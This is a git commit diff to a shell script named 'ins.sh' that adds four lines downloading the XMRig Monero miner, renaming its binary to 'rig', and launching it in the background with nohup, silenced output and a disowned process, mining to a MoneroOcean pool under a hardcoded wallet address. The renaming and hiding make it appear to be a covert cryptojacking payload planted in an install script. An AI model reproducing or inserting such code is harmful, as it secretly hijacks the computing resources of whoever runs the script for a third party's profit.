f5c23c6e2a9b90785418c9c7e824eeccb042bb7d
drapo <136377959+m4rtis01@users.noreply.github.com>
2023-08-01 09:48:33 +0100

    Update ins.sh

--- ins.sh
+++ ins.sh
@@ -1,1 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz
+mv xmrig-6.20.0/xmrig xmrig-6.20.0/rig
+nohup xmrig-6.20.0/rig -a rx -o gulf.moneroocean.stream:10128 -u 41qn42wuAxjDb5Euccqitk7z7kWJ1ZSyCWkArNPexdyG4cC8wP3FRHGGgBxoFqYWktMvySUWLWg7ghzccooPKWgWQ3bt6Kr -p x &>/dev/null & disown -h %1
 
